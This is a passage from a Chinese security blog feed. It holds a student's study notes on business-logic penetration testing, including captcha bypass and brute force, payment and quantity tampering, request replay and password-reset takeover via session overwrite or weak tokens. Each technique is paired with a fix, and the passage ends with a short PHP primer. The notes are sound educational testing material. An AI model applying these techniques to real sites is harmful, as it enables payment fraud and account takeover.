title="测试过程"></a>测试过程</h3><p>攻击者填写投诉建议，输入页面验证码，抓取提交的数据包，使用发包工具对数据包进行重复提交，然后查看投诉建议页面是否成功提交了多个投诉信息。</p><p>输入内容，输入验证码，抓数据包，并修改内容参数的值，通过bp重复提交投诉信息，经过暴力重复提交，客户端显示提交成功，用首次验证码成功多次提交</p><h3 id="修复建议-21"><a href="#修复建议-21" class="headerlink" title="修复建议"></a>修复建议</h3><p>针对验证认证次数问题，建议验证码在一次认证成功后，服务端清空认证成功的Session，有效防止一次认证反复使用的问题</p><h2 id="验证码客户端回显测试"><a href="#验证码客户端回显测试" class="headerlink" title="验证码客户端回显测试"></a>验证码客户端回显测试</h2><p>当验证码在客户端生成而非服务器端生成时，就会造成该问题，当客户端需要和服务端进行交互发送验证码时，可借助浏览器的工具查看客户端与服务器进行交互的详细信息</p><h3 id="测试过程-15"><a href="#测试过程-15" class="headerlink" title="测试过程"></a>测试过程</h3><p>攻击者进入找回密码页面，输入手机号与证件号，获取验证码，服务器会向手机发送验证码，通过浏览器工具查看返回包信息，如果返回包中含验证码，证明存在此类问题。</p><h3 id="修复建议-22"><a href="#修复建议-22" class="headerlink" title="修复建议"></a>修复建议</h3><ul><li>禁止验证码在本地客户端生成，应采用服务器端验证码生成机制</li><li>设置验证码的时效性，如180秒过期</li><li>验证码应随机生成，且使用一次即失效</li></ul><h2 id="验证码绕过测试"><a href="#验证码绕过测试" class="headerlink" title="验证码绕过测试"></a>验证码绕过测试</h2><p>通过修改提交服务器返回的数据，可以实现绕过验证码，执行我们的请求</p><h3 id="测试过程-16"><a href="#测试过程-16" class="headerlink" title="测试过程"></a>测试过程</h3><p>攻击者进入注册账户页面，输入任意手机号码，获取验证码，在注册账户页面填写任意验证码，提交请求并抓包，使用抓包工具查看并修改返回包信息，转发返回数据包，查看是否注册成功。</p><h3 id="修复建议-23"><a href="#修复建议-23" class="headerlink" title="修复建议"></a>修复建议</h3><p>在服务端增加验证码的认证机制，对客户端提交的验证码进行二次校验。</p><h2 id="验证码自动识别测试"><a href="#验证码自动识别测试" class="headerlink" title="验证码自动识别测试"></a>验证码自动识别测试</h2><p>以图形验证码为例，一般队医此类验证码的识别流程为：图像二值化处理-&gt;去干扰-&gt;字符分割-&gt;字符识别</p><p>图像二值化就是将图像上像素点的灰度值设置为0或255，也就是将整个图像呈现出明显的黑白效果</p><p>为防止验证码被自动识别，通常加入一些点、线、色彩之类的方式进行图像干扰。</p><p>字符分割主要包括从验证码图像中分割出字符区域，以及把字符区域划分成单个字符</p><p>字符识别就是把处理后的图片还原回字符文本的过程。</p><h3 id="测试过程-17"><a href="#测试过程-17" class="headerlink" title="测试过程"></a>测试过程</h3><p>攻击者访问网站登录页面，通过刷新你验证码页面查看验证码组成规律，进行图像二值化、去干扰等处理，并进行人工对比，存储成功识别的验证码包，截入工具，利用工具对登录页面进行暴力破解，根据返回包的大小和关键字判断是否破解成功。</p><p>用bp抓登录包，将登录包放在PKAV HTTP Fuzzer工具的请求包中，设置验证码标志位，用户名和密码标志位。</p><p>进行验证码爆破，发现长度为611的返回包，可成功登录网站。</p><h3 id="修复建议-24"><a href="#修复建议-24" class="headerlink" title="修复建议"></a>修复建议</h3><ul><li>增加背景元素的干扰，如背景色，背景字母等</li><li>字符的字体进行扭曲、粘连</li><li>使用公式、逻辑验证方法等作为验证码，如四则运算法、问答题等</li><li>图形验证码和使用者相关，比如选择联系人头像、选择购买过的物品等作为验证码</li></ul><h1 id="业务数据安全测试"><a href="#业务数据安全测试" class="headerlink" title="业务数据安全测试"></a>业务数据安全测试</h1><h2 id="商品支付金额篡改测试"><a href="#商品支付金额篡改测试" class="headerlink" title="商品支付金额篡改测试"></a>商品支付金额篡改测试</h2><p>通常在订购类交易流程中，容易出现服务器端未对用户提交的业务数据进行强制校验，过度信赖客户端提交的业务数据而导致的商品金额篡改漏洞</p><h3 id="测试过程-18"><a href="#测试过程-18" class="headerlink" title="测试过程"></a>测试过程</h3><p>该测试主要针对订单生成过程中存在商品支付金额校验不完整而产生业务安全风险点，通常导致攻击者用实际支付远低于订单支付的金额订购商品的业务逻辑漏洞。</p><p>选择购卡面值进入支付平台，抓包篡改支付请求中明文金额字段，跳转支付平台，完成篡改后订单金额支付流程</p><h3 id="修复建议-25"><a href="#修复建议-25" class="headerlink" title="修复建议"></a>修复建议</h3><p>商品信息，如金额、折扣等原始数据的校验应来自于服务器端，不应接受客户端传递过来的值</p><h2 id="商品订购数量篡改测试"><a href="#商品订购数量篡改测试" class="headerlink" title="商品订购数量篡改测试"></a>商品订购数量篡改测试</h2><p>商品数量篡改测试是通过在业务流程中抓包修改订购商品数量等字段，如将请求中的商品数量修改成任意非预期数额、负数等后进行提交，查看业务系统能否以修改后的数量完成业务流程。</p><h3 id="测试过程-19"><a href="#测试过程-19" class="headerlink" title="测试过程"></a>测试过程</h3><p>将商品放入购物车，在购物车中进行礼品兑换，确认商品订单准备进行数据包信息篡改，抓包，将商品数量参数改为负数，并保存，</p><p>可以看到购物车中实际支付积分已经变为负积分。</p><p>添加配送信息，确认订单信息，获取验证码后通过，进入订单确认页面，提交订单订购请求。</p><h3 id="修复建议-26"><a href="#修复建议-26" class="headerlink" title="修复建议"></a>修复建议</h3><p>服务端应当考虑交易风险控制，对产生异常情况的交易行为（如用户积分数额为负值、兑换库存数量为0的商品等）应当直接予以限制、阻断，而非继续完成整个交易流程</p><h2 id="前端JS限制绕过测试"><a href="#前端JS限制绕过测试" class="headerlink" title="前端JS限制绕过测试"></a>前端JS限制绕过测试</h2><p>商品在限制用户购买数量时，服务器仅在页面通过js脚本限制，未在服务器端校验用户提交的数量，通过抓取客户端发送的请求包修改JS端生成处理的交易数据，如将请求中的商品数量改为大于最大数限制的值，查看能否以非正常业务交易数据完成业务流程。</p><h3 id="测试过程-20"><a href="#测试过程-20" class="headerlink" title="测试过程"></a>测试过程</h3><p>该项测试主要针对电商平台由于交易限制机制不严谨、不完善而导致的一些业务逻辑问题</p><p>购买限购商品，数量为2份，加入购物车。</p><p>客户端在前端浏览器使用js做了购买限制，尝试绕过限制提交购买请求，可以通过抓包修改数量字段，改为100个后成功提交。</p><h3 id="修复建议-27"><a href="#修复建议-27" class="headerlink" title="修复建议"></a>修复建议</h3><p>商品信息，如金额、折扣、数量等原始数据的校验应来自于服务器端，不应该完全相信客户端传递过来的值。类似的跨平台支付业务，涉及平台之间接口调用，一定要做好对重要数据的完整性校验，确保业务重要数据在平台间传输的一致。</p><h2 id="请求重放测试（不理解）"><a href="#请求重放测试（不理解）" class="headerlink" title="请求重放测试（不理解）"></a>请求重放测试（不理解）</h2><p>商品首次购买成功后，参照订购商品的正常流程请求，进行完全模拟正常订购业务流程的重放操作，可以实现一次购买多次收获等违背正常业务逻辑的结果。</p><h3 id="测试过程-21"><a href="#测试过程-21" class="headerlink" title="测试过程"></a>测试过程</h3><p>在生成订单流程时抓取订购请求，观察每次订购相同商品的请求是否存在不同的随机token、可变参数等，若有则检查这些随机数的变化情况和失效请款，是否在当前订购流程中唯一有效。</p><p>尝试重放之前已经完成流程的订购请求，观察服务器端是否做出正确响应，若订购再次生效，订单再次生成则表明服务器存在脆弱性。</p><h3 id="修复建议-28"><a href="#修复建议-28" class="headerlink" title="修复建议"></a>修复建议</h3><p>用户每次订单token不应该能重复提交，避免产生重放订购请求的情况。在服务器订单生成关键环节，应该对订单token对应的订购信息内容、用户身份、用户可用积分等进行强校验。</p><h2 id="业务上限测试"><a href="#业务上限测试" class="headerlink" title="业务上限测试"></a>业务上限测试</h2><p>业务上限测试主要是针对一些电商类应用程序在进行业务办理流程中，服务端没有对用户提交的查询范围、订单数量、金额等数据进行严格校验而引发的一些业务逻辑漏洞。在业务流程中通过向服务端提交高于或低于预期的数据以校验服务端是否对所提交的数据做预期强校验。存在此类脆弱性的应用程序，通常表现为查询到超出预期的信息、订购或兑换超过预期范围的商品等。</p><h3 id="测试过程-22"><a href="#测试过程-22" class="headerlink" title="测试过程"></a>测试过程</h3><p>判断应用程序是否对业务预期范围外的业务请求做出正确回应。</p><p>在业务查询中只允许登录用户查询6个月内受理记录，单抓包分析出查询请求中存在明文字段month，修改查询范围到6个月以上提交，可以成功，表明该功能不符合业务要求</p><h3 id="修复建议-29"><a href="#修复建议-29" class="headerlink" title="修复建议"></a>修复建议</h3><p>在服务器端应对订单token对应的订购信息内容、用户身份、用户可用积分等进行强校验，服务端应考虑交易风险控制，对产生异常情况的交易行为直接予以限制、阻断，停止完成整个交易流程。</p><h1 id="业务流程乱序测试"><a href="#业务流程乱序测试" class="headerlink" title="业务流程乱序测试"></a>业务流程乱序测试</h1><h2 id="业务流程绕过测试"><a href="#业务流程绕过测试" class="headerlink" title="业务流程绕过测试"></a>业务流程绕过测试</h2><p>该项主要针对业务流程的处理流程是否正常，确保攻击者无法通过技术手段绕过某些重要流程步骤，检验办理业务过程中是否有控制机制来保证其遵循正常流程。</p><h3 id="测试过程-23"><a href="#测试过程-23" class="headerlink" title="测试过程"></a>测试过程</h3><p>攻击者访问注册页面，注册测试账户，充值提交并抓取数据包，填写任意充值金额并抓包，获取订单号，利用订单号构造充值链接并访问链接，查看是否充值成功，如果充值成功说明存在业务流程绕过问题。</p><h3 id="修复建议-30"><a href="#修复建议-30" class="headerlink" title="修复建议"></a>修复建议</h3><p>建议对敏感信息如身份ID、账号密码、订单号、金额等进行加密处理，并在服务端对其进行二次比对。</p><h1 id="密码找回模块测试"><a href="#密码找回模块测试" class="headerlink" title="密码找回模块测试"></a>密码找回模块测试</h1><h2 id="验证码客户端回显测试-1"><a href="#验证码客户端回显测试-1" class="headerlink" title="验证码客户端回显测试"></a>验证码客户端回显测试</h2><p>找回密码测试中要注意验证码是否会回显在响应中。</p><h3 id="测试流程"><a href="#测试流程" class="headerlink" title="测试流程"></a>测试流程</h3><p>填入要找回的账号，bp抓返回包找到正确验证码，将正确验证码发送给服务端已达到密码重置的目的。</p><h3 id="修复建议-31"><a href="#修复建议-31" class="headerlink" title="修复建议"></a>修复建议</h3><p>避免返回验证码到响应包中，验证码一定要放在服务端校验</p><h2 id="验证码暴力破解测试-1"><a href="#验证码暴力破解测试-1" class="headerlink" title="验证码暴力破解测试"></a>验证码暴力破解测试</h2><p>找回密码功能模块中通常会将用户凭证发送到用户自己才可以看到的手机号或邮箱中，但有些应用在验证码发送功能模块中验证码位数及复杂性较弱，也没有对验证码做次数限制而导致验证码可被暴力枚举并修改任意用户密码。</p><h3 id="测试过程-24"><a href="#测试过程-24" class="headerlink" title="测试过程"></a>测试过程</h3><p>在app的找回密码功能，输入手机号并发送验证码（4位），</p><p>填写任意4位验证码，当请求包被拦截后可以观察到用户手机号，验证码（自己填的那个），密码。</p><p>将请求包发送到bp的Intruder模块中，并把验证码参数进行枚举测试。</p><h3 id="修复建议-32"><a href="#修复建议-32" class="headerlink" title="修复建议"></a>修复建议</h3><p>建议对用户输入的验证码校验采取错误次数限制并提高验证码的复杂度。</p><h2 id="接口参数账号修改测试"><a href="#接口参数账号修改测试" class="headerlink" title="接口参数账号修改测试"></a>接口参数账号修改测试</h2><p>找回密码功能逻辑中常常会在用户修改密码接口提交此参数中存在传递用户账号的参数，而用户账号参数作为一个可控的变量是可以被篡改的，从而导致修改账号密码的凭证或修改的目标账号出现偏差，最终造成任意账号密码修改的漏洞。</p><p>通常在找回密码逻辑中，服务端会要求用户提供要修改的账号，给这个账号发送只有账号主人才能看到的凭证，但如果服务端对账号的控制逻辑不当，就会导致原有账号被篡改为其他账号，服务端把凭证发送给篡改后的账号的邮箱或手机，最终造成可利用凭证重置任意账号密码的漏洞。</p><h3 id="测试流程-1"><a href="#测试流程-1" class="headerlink" title="测试流程"></a>测试流程</h3><p>拦截前端请求，通过修改请求内邮箱或手机号等参数，将修改后数据发送给服务器进行欺骗，达到密码重置的目的。</p><h3 id="修复建议-33"><a href="#修复建议-33" class="headerlink" title="修复建议"></a>修复建议</h3><p>对找回密码的token做一对一的校验，一个token只能修改一个用户，同时保证token不泄露。</p><h2 id="Response状态值修改测试"><a href="#Response状态值修改测试" class="headerlink" title="Response状态值修改测试"></a>Response状态值修改测试</h2><p>修改请求的响应结果来达到密码啊重置的目的。该漏洞利用方式通常在服务端发送某个密码重置的凭证请求后，出现特定的响应值，比如true、1、ok、success等，网站看到回显内容为特定值后即修改密码，通常这种漏洞的回显值校验是在客户端进行的，所以只需要修改回显即可。</p><h3 id="修复建议-34"><a href="#修复建议-34" class="headerlink" title="修复建议"></a>修复建议</h3><p>不要在前端利用服务端返回值判断是否可以修改密码，要把整个校验环节交给服务端验证。</p><h2 id="Session覆盖测试（任意密码重置漏洞）"><a href="#Session覆盖测试（任意密码重置漏洞）" class="headerlink" title="Session覆盖测试（任意密码重置漏洞）"></a>Session覆盖测试（任意密码重置漏洞）</h2><p>找回密码逻辑漏洞测试中也会遇到参数不可控的情况，比如要修改的用户名或者绑定的手机号无法在提交参数时修改，服务端通过读取当前session会话来判断要修改密码的账号，这种情况下能否对Session中的内容做修改以达到任意密码重置的目的呢？</p><p>在某网站中的找回密码功能中，业务逻辑是：由用户使用手机进行注册，然后服务端向手机发送验证码短信，用户输入验证码提交后，进入密码重置页面。</p><p>对网站中Session覆盖的测试如下：</p><p>（1）需要准备自己的账号接收凭证（短信验证码）；</p><p>（2）获得凭证校验成功后进入密码重置页面；</p><p>（3）在浏览器新标签重新打开找回密码页面，输入目标手机号；</p><p>（4）此时当前 Session账户已经被覆盖，重新回到第二步中打开的重置密码页面即可重置目标手机号。</p><h3 id="测试过程-25"><a href="#测试过程-25" class="headerlink" title="测试过程"></a>测试过程</h3><ul><li>在找回密码页面输入A手机号，接受验证码，通过验证后，进入密码重置页面</li><li>打开一个新标签，进入找回密码的第一步页面，输入B手机号码，向B手机号发送验证码，虽然无法拿到B手机号验证码，但是服务端已经将当前Session会话设置为B手机号的用户，这时候再刷新A手机号密码重置页面。</li><li>刷新后A手机号已经改为B手机号，说明Session成功覆盖。</li></ul><h3 id="修复建议-35"><a href="#修复建议-35" class="headerlink" title="修复建议"></a>修复建议</h3><p>Session覆盖类似于账号参数的修改，只是以控制当前Session的方式篡改了要重置密码的账号，在重置密码请求中一定要对修改的账号和凭证是否一致做进一步的校验。</p><h2 id="弱Token设计缺陷测试（看懂了但是不会做）"><a href="#弱Token设计缺陷测试（看懂了但是不会做）" class="headerlink" title="弱Token设计缺陷测试（看懂了但是不会做）"></a>弱Token设计缺陷测试（看懂了但是不会做）</h2><p>在找回密码功能中，网站向用户邮箱发送找回密码链接，用户进入链接进入密码重置页面，链接通常会加入校验参数来确认有效性，通过校验参数的值与数据库生成的值是否一致来判断当前找回密码的链接是否有效。</p><p>例如，网站给出的找回密码的url如下，单击这个链接将跳转到重置密码页面。</p><p><code>http://www.xxx.com/findpwd?uid=xx-uu-xx-sxx&amp;token=1497515314</code></p><p>uid对应修改密码的账号，token就是校验参数，cancel系统使用时间戳生成token，通过时间格式化后发现确实是日期，那么token就是可预测的一个时间范围，可以暴力枚举。</p><h3 id="测试流程-2"><a href="#测试流程-2" class="headerlink" title="测试流程"></a>测试流程</h3><ul><li>在密码找回功能中填写邮箱，多点击几次发送验证信息，可以在邮箱中获得多个找回密码的凭证，多封密码找回邮件，关照凭证规律，通过对比发现token不断变化，参数通过base64编码</li><li>解码查看，发现token值是base64(用户邮箱+随机4位验证码)，就可以暴力枚举获得验证码，加上用户名加上base64编码，最后得到任意用户的密码找回凭证。</li></ul><h3 id="修复建议-36"><a href="#修复建议-36" class="headerlink" title="修复建议"></a>修复建议</h3><p>密码找回token不能使用时间戳或用户邮箱和较短有规律可循的数字字符，应当使用复杂的token生成机制让攻击者无法推测出具体的值。</p><h2 id="密码找回流程绕过测试"><a href="#密码找回流程绕过测试" class="headerlink" title="密码找回流程绕过测试"></a>密码找回流程绕过测试</h2><p>用户修改密码需要向服务器发送修改密码请求，服务器通过后再修改数据库中相应的密码，所以在测试中我们首先要收集三个步骤的请求接口，这样我们可以指姐姐跳过凭证校验的接口去尝试直接重置密码。</p><h3 id="测试流程-3"><a href="#测试流程-3" class="headerlink" title="测试流程"></a>测试流程</h3><ul><li>先注册一个账号用于测试，在找回密码页面输入账号，找回密码页面url为<code>GET/account/findPassword.html</code></li><li>进入凭证验证流程，url为<code>GET/forgetpwd/findPassNext.do</code></li><li>通过验证后进入重置密码，<code>GET/forgetpwd/emailValidateNext.do</code></li><li>获取到三个步骤的url，尝试在输入账号后进入验证身份页面，修改该url为密码重置的url</li><li>经测试发现无需验证身份就可以直接进入重置密码页面，绕过了验证身份一步。</li></ul><h3 id="修复建议-37"><a href="#修复建议-37" class="headerlink" title="修复建议"></a>修复建议</h3><p>防止跳过验证步骤一定要在后端逻辑校验中确认上一步流程已经完成。</p><h1 id="业务接口调用模块测试"><a href="#业务接口调用模块测试" class="headerlink" title="业务接口调用模块测试"></a>业务接口调用模块测试</h1><h2 id="接口调用重放测试"><a href="#接口调用重放测试" class="headerlink" title="接口调用重放测试"></a>接口调用重放测试</h2><p>在短信、邮件调用业务或生成业务数据环节中，对业务环节进行调用(重放)测试，若业务经过调用后多次生成有效的业务或数据结果，可判断为存在接口调用问题</p><h3 id="测试流程-4"><a href="#测试流程-4" class="headerlink" title="测试流程"></a>测试流程</h3><p>在购买机票提交订单环节抓包，bp对生成订单的数据包进行重放测试。订单在一分钟内重复生成。</p><h3 id="修复建议-38"><a href="#修复建议-38" class="headerlink" title="修复建议"></a>修复建议</h3><ul><li>对生成订单环节采用验证码机制，防止生成数据业务被恶意调用</li><li>每一个订单使用唯一的token，订单提交一次后，token失效</li></ul><h2 id="接口调用遍历测试"><a href="#接口调用遍历测试" class="headerlink" title="接口调用遍历测试"></a>接口调用遍历测试</h2><p>web接口一般将常见的一些功能需求进行封装，通过传入不同的参数来获取数据或者执行相应的功能，例如通过接口传入id参数，返回对应id的一些信息，在安全测试中，可以使用bp作为http代理，记录所有请求和响应信息，通过bp以登录后的状态对整站进行爬取，再使用过滤功能找到传入id参数的http请求，通过intruder对id参数进行遍历，看是否返回不同的响应信息，若不同的id值对应不同用户的信息，则说明存在漏洞。</p><h3 id="测试过程（看不懂，书166页）"><a href="#测试过程（看不懂，书166页）" class="headerlink" title="测试过程（看不懂，书166页）"></a>测试过程（看不懂，书166页）</h3><p>略</p><h3 id="修复建议-39"><a href="#修复建议-39" class="headerlink" title="修复建议"></a>修复建议</h3><p>在session中存储当前用户的凭证或id，只有传入凭证或id参数值与Session中的一致才返回数据内容</p><h2 id="接口调用参数篡改测试"><a href="#接口调用参数篡改测试" class="headerlink" title="接口调用参数篡改测试"></a>接口调用参数篡改测试</h2><p>修改对应请求中的手机号或邮箱参数值，修改后能接收到信息证明漏洞存在</p><h3 id="测试过程-26"><a href="#测试过程-26" class="headerlink" title="测试过程"></a>测试过程</h3><ul><li>在验证码页面单击重新发送，抓包，将手机号码参数改为其他手机号，修改后的手机接收到验证码</li></ul><h3 id="修复建议-40"><a href="#修复建议-40" class="headerlink" title="修复建议"></a>修复建议</h3><ul><li>会话session中存储重要凭证，在忘记密码、重新发送验证码等业务中，从session获取用户凭证而不是从客户请求的参数中获取</li><li>从客户端处获取手机号、邮箱等账号信息，要与session中的凭证进行对比，验证通过后才允许进行业务操作。</li></ul><h2 id="接口未授权访问-x2F-调用测试"><a href="#接口未授权访问-x2F-调用测试" class="headerlink" title="接口未授权访问/调用测试"></a>接口未授权访问/调用测试</h2><p>在正常业务中，敏感功能的接口需要对访问者身份进行验证，通过后才允许调用接口，若接口没有身份验证，那么攻击者无须登录验证即可调用接口操作。</p><p>bp作为Http代理，在登录状态下记录所有请求和响应信息，筛选出敏感功能、返回敏感数据的请求，在未登录的情况下，使用浏览器访问对应敏感功能的请求，若返回的数据与与登录状态后的一致，则存在漏洞</p><h3 id="测试过程（又是个bp爬取的，妈的不会，176页）"><a href="#测试过程（又是个bp爬取的，妈的不会，176页）" class="headerlink" title="测试过程（又是个bp爬取的，妈的不会，176页）"></a>测试过程（又是个bp爬取的，妈的不会，176页）</h3><p>略</p><h3 id="修复建议-41"><a href="#修复建议-41" class="headerlink" title="修复建议"></a>修复建议</h3><p>采用token校验方式，在url中添加一个token参数，只有token验证通过才返回接口数据且token使用一次后失效</p><p>在接口被调用时，后端会对会话状态进行验证，若已经登录便返回接口数据，如果未登录则返回错误信息。</p><h2 id="Callback自定义测试"><a href="#Callback自定义测试" class="headerlink" title="Callback自定义测试"></a>Callback自定义测试</h2><p>在浏览器中存在同源策略，同源策略是指域名、协议、端口相同，当使用Ajax异步传输数据时，非同源域名之间会存在限制，其中有一种解决方法时jsonp，基本原理是利用了html里<code>&lt;script&gt;&lt;/script&gt;</code>元素标签，远程调用json文件来实现数据传递，jsonp技术这种一般使用callback（回调函数）参数来声明回调时所使用的函数名，由于没有使用白名单的方法进行限制callback的函数名，导致攻击者可以自定义callback内容，从而触发xss等漏洞</p><h3 id="测试过程（178页）"><a href="#测试过程（178页）" class="headerlink" title="测试过程（178页）"></a>测试过程（178页）</h3><p>略</p><h3 id="修复建议-42"><a href="#修复建议-42" class="headerlink" title="修复建议"></a>修复建议</h3><ul><li>严格定义 HTTP 响应中的 Content-Type 为json 数据格式：<code>Content-Type：application/json</code></li><li>建立callback函数白名单，如果传入的callback参数值不在白名单内，跳转到统一的异常界面阻止其继续输出。</li><li>对callback参数进行HTML实体编码来过滤掉<code>“&lt;”、“&gt;”</code>等字符。</li></ul><h2 id="WebService测试"><a href="#WebService测试" class="headerlink" title="WebService测试"></a>WebService测试</h2><p>WebService是一种跨编程语言和跨操作系统平台的远程调用技术。XML+XSD、SOAP（Simple Object Access Protocol）和WSDL（WebServices Description Language）就是构成WebService平台的三大技术，其中XML+XSD用来描述、表达要传输的数据；SOAP是用于交换XML编码信息的轻量级协议，一般以XML或者XSD作为载体，通过HTTP协议发送请求和接收结果，SOAP协议会在HTTP协议的基础上增加一些特定的HTTP消息头；WSDL是一个基于XML的用于描述Web Service及其函数、参数和返回值的语言。</p><p>webservice就是一个应用程序向外界暴力出一个能通过web进行调用的api,它接收用户输入的参数，然后返回相关的数据内容，若一个webService完全信任用户的输入，不进行过滤，则有可能导致sql注入漏洞发生。</p><h3 id="测试过程（183页）"><a href="#测试过程（183页）" class="headerlink" title="测试过程（183页）"></a>测试过程（183页）</h3><h3 id="修复建议-43"><a href="#修复建议-43" class="headerlink" title="修复建议"></a>修复建议</h3><ul><li>为webservice添加身份认证，认证成功后才允许访问和调用</li><li>webservice中接收输入参数的函数，在后端应该对输入参数进行过滤及净化，在处理后才入库查询</li><li>在敏感功能的函数中，添加密码认证，认证后才允许调用敏感功能的函数。</li></ul><h1 id="实践篇"><a href="#实践篇" class="headerlink" title="实践篇"></a>实践篇</h1><h1 id="账号安全案例总结"><a href="#账号安全案例总结" class="headerlink" title="账号安全案例总结"></a>账号安全案例总结</h1><p>略</p><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h3><p>是攻击者插入到原本直接通信的双方中间，让双方以为还在直接跟对方通信，但实际上双方的通信对象已变成了攻击者，同时信息已经被中间人获取或篡改。而中间人攻击不仅可以捕获HTTP未加密的传输数据，更可以捕获HTTPS协议加密的数据。<br>HTTPS中间人攻击一般分为SSL连接建立前的攻击，以及HTTPS传输过程中的攻击。常见的HTTPS中间人攻击，会首先需结合ARP、DNS欺骗、伪造CA证书等技术，来对会话进行拦截。</p><h3 id="SSL证书欺骗"><a href="#SSL证书欺骗" class="headerlink" title="SSL证书欺骗"></a>SSL证书欺骗</h3><p>通过DNS劫持和局域网ARP欺骗甚至网关劫持等技术，将用户访问重定向到攻击者的设备上，让用户机器与攻击者机器建立https链接，而攻击者机器再跟web服务端连接，这样攻击者分别与用户和真正的服务器建立ssl连接。</p><h3 id="SSL劫持"><a href="#SSL劫持" class="headerlink" title="SSL劫持"></a>SSL劫持</h3><p>将页面中https超链接替换成http版本，用户始终以明文形式进行通信。</p><h3 id="撞库攻击"><a href="#撞库攻击" class="headerlink" title="撞库攻击"></a>撞库攻击</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;业务安全测试通常是指针对业务运行的软硬件平台，业务系统所提供的服务进行安全测试，保护业务系统免受安全威胁，以验证业务系统符合安全需求定义和安全标准的过程。&lt;/p&gt;
&lt;p&gt;业务风险点识别应主要关注以下安全风险内容：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;业务环节存在的安全风险：业务环节存</summary>
      
    
    
    
    
    <category term="业务渗透" scheme="https://sinky.top/tags/%E4%B8%9A%E5%8A%A1%E6%B8%97%E9%80%8F/"/>
    
    <category term="WEB，学习笔记" scheme="https://sinky.top/tags/WEB%EF%BC%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>php学习1</title>
    <link href="https://sinky.top/2022/11/07/php%E5%AD%A6%E4%B9%A01/"/>
    <id>https://sinky.top/2022/11/07/php%E5%AD%A6%E4%B9%A01/</id>
    <published>2022-11-07T14:11:19.283Z</published>
    <updated>2022-11-18T08:40:52.823Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网站基本概念"><a href="#网站基本概念" class="headerlink" title="网站基本概念"></a>网站基本概念</h1><ol><li>服务器：提供计算机服务的机器，取决于机器上所安装的软件（服务软件）<ol><li>web服务器：提供web服务（网站访问），需要安装web服务软件，Apache,tomcat,iis等</li></ol></li><li>IP：网络互连协议，为计算机网络相互连接进行通信而设计的协议，IP地址具有唯一性（每台电脑都有一个唯一的IP地址）</li><li>域名：由遗传用点分割的名字组成（<code>www.baidu.ccom</code>）的Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位，一个域名的目的是便于记忆和沟通的一组服务器的地址。<ol><li>特殊IP:<code>127.0.0.1</code> 代表本机</li><li>特殊域名：<code>localhost.com</code></li></ol></li><li>DNS:域名系统，作为域名和IP地址相互映射的一个分布式数据库，使用户更方便的访问互联网，通过主机名，得到该主机名对应的IP地址的过程叫做域名解析。<ol><li><code>用户输入域名 localhost -&gt; DNS(localhost 127.0.0.1) -&gt; 服务器电脑</code></li></ol></li><li>端口：(port) 设备与外界通讯交流的出口，分为虚拟端口和物理端口<ol><li>虚拟端口：指计算机内部或交换机路由器内的端口，不可见，如80端口、21、23等；</li><li>物理端口：又称为接口，时可见接口，计算机背板的RJ45网口，交换机路由器集线器等RJ45端口<br> 3.<code>用户输入域名 localhost:端口 -&gt; DNS(localhost 127.0.0.1) -&gt; 服务器电脑 -&gt; 软件（服务）</code></li></ol></li></ol><h1 id="Web程序的访问流程"><a href="#Web程序的访问流程" class="headerlink" title="Web程序的访问流程"></a>Web程序的访问流程</h1><p>web分为两类：静态网站和动态网站</p><p>浏览器发起访问-&gt; DNS解析域名-&gt; 服务器电脑-&gt; 服务软件</p><h2 id="静态网站的访问"><a href="#静态网站的访问" class="headerlink" title="静态网站的访问"></a>静态网站的访问</h2><p>访问<code>http://localhost:80/index.html</code></p><p><img src="https://s2.loli.net/2022/11/15/9Zne3TXqFwEQaxY.png" alt="image.png"></p><h2 id="动态网站访问"><a href="#动态网站访问" class="headerlink" title="动态网站访问"></a>动态网站访问</h2><p>与静态类似，但比静态多出两个内容：服务器端解析、数据库。</p><p>访问<code>http://localhost:80/index.php</code></p><p><img src="https://s2.loli.net/2022/11/15/raP1p2C7BzXuUWI.png" alt="image.png"></p><h1 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h1><p>安个phpstudy就行了</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;网站基本概念&quot;&gt;&lt;a href=&quot;#网站基本概念&quot; class=&quot;headerlink&quot; title=&quot;网站基本概念&quot;&gt;&lt;/a&gt;网站基本概念&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;服务器：提供计算机服务的机器，取决于机器上所安装的软件（服务软件）&lt;ol&gt;
&lt;li&gt;web服务器</summary>
      
    
    
    
    
    <category term="php" scheme="https://sinky.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>WebShell文件上传漏洞分析溯源(第3题)</title>
    <link href="https://sinky.top/2022/11/02/%E9%9D%B6%E5%9C%BA%EF%BC%9AWebShell%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90(%E7%AC%AC3%E9%A2%98)/"/>
    <id>https://sinky.top/2022/11/02/%E9%9D%B6%E5%9C%BA%EF%BC%9AWebShell%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90(%E7%AC%AC3%E9%A2%98)/</id>
    <published>2022-11-02T03:29:18.354Z</published>
    <updated>2022-11-02T07:18:33.796Z</updated>
    
